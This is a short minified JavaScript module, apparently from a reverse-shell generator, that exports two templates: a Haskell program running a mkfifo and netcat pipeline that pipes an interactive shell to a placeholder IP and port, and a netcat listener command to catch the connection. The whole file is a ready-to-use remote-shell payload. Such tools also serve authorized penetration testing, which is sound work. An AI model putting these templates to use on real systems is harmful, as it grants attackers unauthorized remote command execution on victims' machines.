const e=[{title:"Haskell Reverse Shell",template:`module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc {ip} {port} >/tmp/f"`,description:"A simple Haskell reverse shell using mkfifo and netcat connecting back to IP {ip} on port {port}."},{title:"Netcat Listener",template:"nc -lvnp {port}",description:"Listener to catch the reverse shell on port {port}."}],t={commands:e};export{e as commands,t as default};
